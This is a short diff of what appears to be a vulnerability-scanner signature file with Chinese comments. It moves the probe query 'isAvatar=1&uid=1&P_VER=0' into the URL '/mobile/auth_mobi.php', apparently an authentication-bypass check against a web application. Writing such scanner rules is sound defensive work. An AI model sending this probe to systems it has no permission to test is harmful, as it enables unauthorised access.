@@ -8,11 +8,11 @@
 
 #漏洞的位置
 - url:
-  - url : "/mobile/auth_mobi.php"
+  - url : "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
 
 #payload
 - payload:
-  - payload: 'isAvatar=1&uid=1&P_VER=0'
+  - payload: 'isNone'
 
 #response包里状态码
 - status:
